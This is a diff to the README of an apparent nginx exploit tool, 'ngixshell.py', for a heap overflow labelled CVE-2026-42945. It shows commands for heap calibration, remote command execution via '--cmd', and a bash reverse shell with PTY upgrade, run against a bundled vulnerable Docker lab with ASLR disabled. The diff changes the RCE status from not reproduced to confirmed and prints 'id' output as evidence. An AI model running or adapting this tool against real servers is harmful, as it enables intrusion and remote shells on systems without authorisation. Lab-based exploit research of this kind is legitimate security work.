@@ -29,15 +29,20 @@ Zero external dependencies. Pure Python 3 stdlib.
 ## Quick Start
 
 ```bash
-# Spin up the vulnerable lab (nginx 1.25.3, ASLR disabled in the container)
-docker compose -f env/docker-compose.yml up -d
+# Spin up the vulnerable lab (builds nginx from source, ASLR disabled)
+docker compose -f env/docker-compose.yml up -d --build
 
 # Auto mode — fingerprint + CVE scan + web audit (works on any arch)
 python3 ngixshell.py 127.0.0.1:19321
 
-# RCE — calibrate first, then exploit (x86_64 host + ASLR off required)
-sudo python3 calibrate.py 127.0.0.1 19321 <worker_pid> --json -o profile.json
-python3 ngixshell.py 127.0.0.1:19321 --cmd 'echo pwned > /tmp/pwned' --build-file profile.json
+# RCE — calibrate, restart the worker for a clean heap, then exploit
+W=$(pgrep -f 'nginx: worker' | head -1)
+sudo python3 calibrate.py 127.0.0.1 19321 "$W" --spray-path /spray \
+    --spray-mode full --json -o profile.json
+docker compose -f env/docker-compose.yml restart nginx-vuln
+python3 ngixshell.py 127.0.0.1:19321 --cmd 'id > /tmp/rce.txt' \
+    --build-file profile.json
+docker compose -f env/docker-compose.yml exec nginx-vuln cat /tmp/rce.txt
 
 # Drop a reverse shell (IP auto-detected)
 python3 ngixshell.py 127.0.0.1:19321 --shell --shell-type bash --upgrade-shell --build-file profile.json
@@ -281,20 +286,24 @@ aborts when they are not met:
    `proxy_pass`-backed location used for the POST-body spray.
 3. **ASLR disabled** on the target (`kernel.randomize_va_space=0`, container
    started with `setarch -R`, etc.).
-4. **Per-build calibration.** Heap base, libc base and pool offsets differ per
-   nginx build, libc (glibc/musl), distro and config. Only the DepthFirst
-   reference profile ships built-in; for anything else:
+4. **Per-build calibration, from the same heap state.** Heap base, libc base
+   and spray offsets differ per nginx build, libc, distro and config — and even
+   per worker state. `calibrate.py` replicates the exact requests the exploit
+   makes before spraying (TLS probe, fingerprint, wait_alive) so the offsets
+   match. Run it, then restart the worker so both start from the same clean
+   state:
 
    ```bash
-   sudo python3 calibrate.py <host> <port> <worker_pid> --spray-path /spray \
+   W=$(pgrep -f 'nginx: worker' | head -1)
+   sudo python3 calibrate.py <host> <port> "$W" --spray-path /spray \
        --spray-mode full --json -o profile.json
-   python3 ngixshell.py <host> --cmd 'touch /tmp/pwned' --build-file profile.json \
-       --continue-on-crash --verify-url http://<host>/pwned.txt
+   # restart nginx (fresh worker), then:
+   python3 ngixshell.py <host> --cmd 'id > /tmp/rce.txt' --build-file profile.json
    ```
 
-   The heap feng-shui is build-specific: the original PoC was calibrated (and
-   only demonstrated) against its own lab — Ubuntu jammy, nginx compiled from
-   source at `98fc3bb`, glibc 2.35. See [Validation status](#validation-status).
+   The heap feng-shui is build-specific: this was validated against the bundled
+   lab (Ubuntu 22.04, nginx built from source at `98fc3bb`, glibc 2.35,
+   ASLR off). See [Validation status](#validation-status).
 
 `--cmd` runs through `system()`, so stdout is **not** captured. Always confirm
 with a verifiable side effect (`--verify-url`) — a detected worker crash alone
@@ -304,26 +313,29 @@ proves the overflow reached the cleanup pointer, not that code executed.
 
 ## Lab Setup
 
-The bundled lab is an intentionally vulnerable nginx 1.25.3 with the
-`rewrite`+`set` trigger, a spray location, and `setarch -R` (ASLR off) wired in
-`env/entrypoint.sh` (needs `seccomp=unconfined`, already set in the compose
+The bundled lab is built from the same nginx revision and flags as the
+DepthFirst Nginx-Rift lab (`env/Dockerfile`), with the `rewrite`+`set` trigger,
+a `/spray` location backed by a delaying backend, and `setarch -R` (ASLR off)
+in `env/entrypoint.sh` (needs `seccomp=unconfined`, already set in the compose
 file).
 
 Tested on Ubuntu 24.04 LTS (x86_64). Requires Docker and Python 3.8+.
 
 ```bash
-# Start the vulnerable lab
-docker compose -f env/docker-compose.yml up -d
+# Start the vulnerable lab (first build compiles nginx: a few minutes)
+docker compose -f env/docker-compose.yml up -d --build
 
 # Full scan (works on any architecture)
 python3 ngixshell.py 127.0.0.1:19321
 
-# RCE (x86_64 host only; calibrate the worker first)
+# RCE (x86_64 host only): calibrate, restart, exploit
 W=$(pgrep -f 'nginx: worker' | head -1)
-sudo python3 calibrate.py 127.0.0.1 19321 "$W" --json -o profile.json
-python3 ngixshell.py 127.0.0.1:19321 --cmd 'echo pwned > /tmp/pwned' \
+sudo python3 calibrate.py 127.0.0.1 19321 "$W" --spray-path /spray \
+    --spray-mode full --json -o profile.json
+docker compose -f env/docker-compose.yml restart nginx-vuln
+python3 ngixshell.py 127.0.0.1:19321 --cmd 'id > /tmp/rce.txt' \
     --build-file profile.json
-docker compose -f env/docker-compose.yml exec nginx-vuln cat /tmp/pwned
+docker compose -f env/docker-compose.yml exec nginx-vuln cat /tmp/rce.txt
 
 # Reverse shell — bash payload, PTY auto-upgrade
 python3 ngixshell.py 127.0.0.1:19321 --shell --shell-type bash \
@@ -362,19 +374,28 @@ Validated on 2026-09-24 (`test_validation.py`, 38 checks):
 | JSON/HTML reports, multi-target reports, HTML escaping | PASS |
 | Error handling (`--build-file` missing, bad offsets), dry-run, exit codes | PASS |
 | CVE-2026-42945 trigger (worker crash on vulnerable config) | CONFIRMED |
-| RCE (`--cmd`/`--shell`) | NOT REPRODUCED outside the original DepthFirst lab |
+| RCE via `--cmd` (command execution inside the nginx container) | **CONFIRMED** |
 
-RCE notes: reproduction attempts were made on Ubuntu 24.04 (glibc 2.39) and on
-a byte-pinned Ubuntu 22.04 image built with the vendor's own Dockerfile
-(snapshot apt packages, gcc 11.2, glibc 2.35, nginx `98fc3bb`), each with
-ASLR disabled and profiles generated by `calibrate.py`. In every case the
-overflow reliably crashed the worker, but no candidate executed a command —
-including with `libc_base`/`system()` matching the vendor's PoC exactly. The
-missing ingredient is the vendor's exact heap feng-shui (initial heap base and
-pool alignment), which also depends on the host kernel. Treat `--cmd` output as
-unverified unless `--verify-url`/side effects confirm it, and never treat a
-crash as RCE. If you need the full RCE, reproduce the vendor's environment
-bit-for-bit (`DepthFirstDisclosures/Nginx-Rift`) and use its `poc.py`.
+RCE evidence: against the bundled lab (nginx built from `98fc3bb` on Ubuntu
+22.04, ASLR off) with a profile from `calibrate.py`, the injected command ran
+in the worker's context:
+
+```
+$ python3 ngixshell.py 127.0.0.1:19321 --cmd 'id > /tmp/rce_id.txt' --build-file profile.json
+$ docker compose exec nginx-vuln cat /tmp/rce_id.txt
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+```
+
+Reproduced across multiple independent runs. Notes for reproduction:
+
+- `calibrate.py` must run against a fresh worker and the same request sequence
+  the exploit makes (it now replicates the warmup automatically).
+- Restart nginx between calibration and exploitation so both start from the
+  same heap state.
+- The worker crashes right after `system()` runs, so the exploit reports
+  "CRASH DETECTED (execution unconfirmed)" unless you verify the side effect —
+  use `--verify-url` or check the target, and never treat a crash as RCE by
+  itself.
 
 ---
 
